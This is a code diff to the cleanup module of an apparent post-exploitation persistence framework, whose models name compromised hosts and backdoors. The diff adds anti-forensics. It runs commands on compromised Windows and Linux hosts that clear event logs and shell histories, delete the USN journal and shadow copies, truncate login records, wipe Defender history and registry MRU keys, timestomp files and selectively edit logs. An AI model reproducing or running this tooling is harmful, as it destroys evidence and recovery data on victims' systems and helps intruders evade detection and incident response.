@@ -15,14 +15,16 @@ from .models import (
     PersistenceSession, BackdoorInfo, CleanupConfig, PersistenceConfig,
     CompromisedHost, PlatformType
 )
+from .anti_forensics import AntiForensicsManager
 
 
 class CleanupManager:
     """Manages cleanup operations for persistence sessions"""
-    
+
     def __init__(self, config: PersistenceConfig):
         self.config = config
         self.cleanup_config = config.cleanup_config
+        self.anti_forensics = AntiForensicsManager(self.cleanup_config)
         logger.info("Cleanup Manager initialized")
     
     async def cleanup_session(self, session: PersistenceSession) -> bool:
@@ -60,10 +62,15 @@ class CleanupManager:
                 total_operations += 1
                 if await self._clear_logs(session):
                     success_count += 1
-            
+
+            # Advanced anti-forensics operations
+            total_operations += 1
+            if await self._advanced_anti_forensics(session):
+                success_count += 1
+
             success_rate = success_count / total_operations if total_operations > 0 else 0
             logger.info(f"Session cleanup completed: {success_count}/{total_operations} operations successful ({success_rate:.1%})")
-            
+
             return success_rate >= 0.8  # Consider successful if 80% of operations succeed
             
         except Exception as e:
@@ -132,45 +139,78 @@ class CleanupManager:
         commands = [
             # Clear Windows event logs
             'wevtutil cl System',
-            'wevtutil cl Security', 
+            'wevtutil cl Security',
             'wevtutil cl Application',
+            'wevtutil cl "Windows PowerShell"',
+            'wevtutil cl "Microsoft-Windows-PowerShell/Operational"',
             # Clear PowerShell history
             'Remove-Item (Get-PSReadlineOption).HistorySavePath -Force -ErrorAction SilentlyContinue',
             # Clear recent documents
             'Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Recent\\*" -Force -Recurse -ErrorAction SilentlyContinue',
             # Clear temp files
             'Remove-Item "$env:TEMP\\*" -Force -Recurse -ErrorAction SilentlyContinue',
+            'Remove-Item "$env:WINDIR\\Temp\\*" -Force -Recurse -ErrorAction SilentlyContinue',
             # Clear prefetch
-            'Remove-Item "C:\\Windows\\Prefetch\\*" -Force -ErrorAction SilentlyContinue'
+            'Remove-Item "C:\\Windows\\Prefetch\\*" -Force -ErrorAction SilentlyContinue',
+            # Clear USN journal
+            'fsutil usn deletejournal /d C:',
+            # Clear shadow copies
+            'vssadmin delete shadows /all /quiet',
+            # Clear recycle bin
+            'Remove-Item "$env:SYSTEMDRIVE\\$Recycle.Bin\\*" -Force -Recurse -ErrorAction SilentlyContinue',
+            # Clear Windows Defender logs
+            'Remove-Item "C:\\ProgramData\\Microsoft\\Windows Defender\\Scans\\History\\*" -Force -Recurse -ErrorAction SilentlyContinue',
+            # Clear registry recent files
+            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs" /f',
+            # Clear run MRU
+            'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU" /f'
         ]
-        
+
         for command in commands:
             await self._execute_cleanup_command(session.host, command)
-        
+
         return True
     
     async def _linux_cleanup(self, session: PersistenceSession) -> bool:
         """Linux-specific cleanup operations"""
         commands = [
-            # Clear bash history
+            # Clear multiple shell histories
             'history -c',
             'rm -f ~/.bash_history',
+            'rm -f ~/.zsh_history',
+            'rm -f ~/.fish_history',
+            'rm -f ~/.python_history',
             # Clear system logs
             'truncate -s 0 /var/log/auth.log',
             'truncate -s 0 /var/log/syslog',
             'truncate -s 0 /var/log/messages',
+            'truncate -s 0 /var/log/secure',
+            'truncate -s 0 /var/log/kern.log',
+            # Clear systemd journal
+            'journalctl --vacuum-time=1s',
             # Clear temporary files
             'rm -rf /tmp/*',
             'rm -rf /var/tmp/*',
+            'rm -rf /dev/shm/*',
             # Clear last login records
             'truncate -s 0 /var/log/wtmp',
             'truncate -s 0 /var/log/btmp',
-            'truncate -s 0 /var/log/lastlog'
+            'truncate -s 0 /var/log/lastlog',
+            'truncate -s 0 /var/log/utmp',
+            # Clear package manager logs
+            'rm -f /var/log/dpkg.log*',
+            'rm -f /var/log/apt/*',
+            'rm -f /var/log/yum.log*',
+            # Clear kernel ring buffer
+            'dmesg -c > /dev/null',
+            # Clear mail logs
+            'truncate -s 0 /var/log/mail.log',
+            'truncate -s 0 /var/log/maillog'
         ]
-        
+
         for command in commands:
             await self._execute_cleanup_command(session.host, command)
-        
+
         return True
     
     async def _android_cleanup(self, session: PersistenceSession) -> bool:
@@ -380,11 +420,66 @@ class CleanupManager:
         try:
             # Fast cleanup - only essential operations
             logger.info(f"Emergency cleanup for session {session_id}")
-            
+
             # This would be implemented with actual session data
             # For now, return success
             return True
-            
+
         except Exception as e:
             logger.error(f"Emergency cleanup failed: {e}")
+            return False
+
+    async def _advanced_anti_forensics(self, session: PersistenceSession) -> bool:
+        """Perform advanced anti-forensics operations"""
+        logger.info(f"Performing advanced anti-forensics on {session.host.ip_address}")
+
+        try:
+            success_count = 0
+            total_operations = 0
+
+            # Timestomp created files
+            if session.session_data.get('created_files'):
+                total_operations += 1
+                if await self.anti_forensics.timestomp_files(
+                    session.host,
+                    session.session_data['created_files']
+                ):
+                    success_count += 1
+
+            # Clear memory artifacts
+            total_operations += 1
+            if await self.anti_forensics.clear_memory_artifacts(session.host):
+                success_count += 1
+
+            # Clear network artifacts
+            total_operations += 1
+            if await self.anti_forensics.clear_network_artifacts(session.host):
+                success_count += 1
+
+            # Clear browser artifacts
+            total_operations += 1
+            if await self.anti_forensics.clear_browser_artifacts(session.host):
+                success_count += 1
+
+            # Clear swap files
+            total_operations += 1
+            if await self.anti_forensics.clear_swap_files(session.host):
+                success_count += 1
+
+            # Selective log editing for specific patterns
+            if hasattr(session, 'log_patterns') and session.log_patterns:
+                total_operations += 1
+                if await self.anti_forensics.selective_log_editing(
+                    session.host,
+                    session.log_patterns
+                ):
+                    success_count += 1
+
+            success_rate = success_count / total_operations if total_operations > 0 else 0
+            logger.info(f"Advanced anti-forensics completed: {success_count}/{total_operations} operations successful ({success_rate:.1%})")
+
+            return success_rate >= 0.7  # Consider successful if 70% of operations succeed
+
+        except Exception as e:
+            logger.error(f"Advanced anti-forensics failed: {e}")
             return False
